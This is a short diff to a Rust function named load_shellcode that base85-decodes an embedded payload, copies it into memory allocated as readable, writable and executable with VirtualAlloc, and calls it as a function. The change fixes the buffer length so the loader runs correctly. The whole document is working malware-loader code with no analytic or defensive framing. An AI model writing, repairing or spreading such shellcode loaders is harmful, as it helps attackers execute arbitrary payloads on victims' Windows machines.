@@ -32,8 +32,8 @@ pub fn load_shellcode()  -> anyhow::Result<()>{
         unsafe {
                 if let Some(shell_code_file) = get_shellcode() {
                     if let Ok(shellcode) = base85::decode(String::from_utf8(shell_code_file.data.to_vec()).unwrap().as_str()) {
-                        let ptr = VirtualAlloc(None, shell_code_file.data.len(), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-                        std::ptr::copy_nonoverlapping(shellcode.as_ptr(), ptr as *mut u8, shell_code_file.data.len());
+                        let ptr = VirtualAlloc(None, shellcode.len(), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+                        std::ptr::copy_nonoverlapping(shellcode.as_ptr(), ptr as *mut u8, shellcode.len());
                         let fn_virtual: fn() = unsafe { std::mem::transmute(ptr) };
                         fn_virtual();
                     }
